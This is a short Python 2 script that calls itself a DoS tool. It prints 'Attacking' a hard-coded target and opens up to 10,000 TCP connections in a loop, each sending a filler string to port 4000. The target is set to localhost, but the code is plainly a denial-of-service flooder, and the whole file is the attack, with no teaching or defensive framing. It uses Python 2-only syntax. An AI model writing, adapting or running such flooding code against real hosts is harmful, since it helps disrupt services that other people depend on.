import os
import sys
import time
import socket
import random

os.system("clear")
print("welcome to Dos")

message = '********************'

ip = '127.0.0.1'
conn = 10000
port = 4000

print(ip)
print("Attacking %s" % ip)


def dos(i):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        sock.send(message)
        sock.sendto(message, (ip, port))
        sock.send(message)
    except socket.error, e:
        print("Connection Failed: %s" % e)
    print("connect %s times to %s through port %s" % (i, ip, port))
    sock.close()


for i in range(1, conn):
    dos(i)

print("The Connection you requested had finished")
